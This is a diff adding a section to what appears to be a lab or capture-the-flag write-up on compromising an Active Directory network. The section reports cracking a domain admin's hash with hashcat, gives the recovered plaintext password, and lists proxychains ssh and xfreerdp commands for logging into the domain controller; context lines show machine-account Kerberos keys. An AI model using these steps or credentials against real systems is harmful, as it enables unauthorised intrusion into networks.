@@ -334,3 +334,22 @@ CORPORATE$:aes128-cts-hmac-sha1-96:99ff5c6b48065f1cc032a1162b89d2b4
 CORPORATE$:des-cbc-md5:80e3c13886ea38a4
 ```
 
+### Since Mercerh is a domain admin on DC and we got their hash, so we use hashcat to crack the hash!
+![[Pasted image 20221026200010.png]]
+The password for Mercerh on Domain Controller will be `pikapikachu7`
+
+Use following command to get into the DC
+```
+proxychains ssh mercerh@10.200.34.117
+
+OR 
+
+proxychains xfreerdp /u:mercerh /p:'pikapikachu7' /v:10.200.34.117 
+```
+
+![[Pasted image 20221026200351.png]]
+- We finally got in!!
+
+
+
+
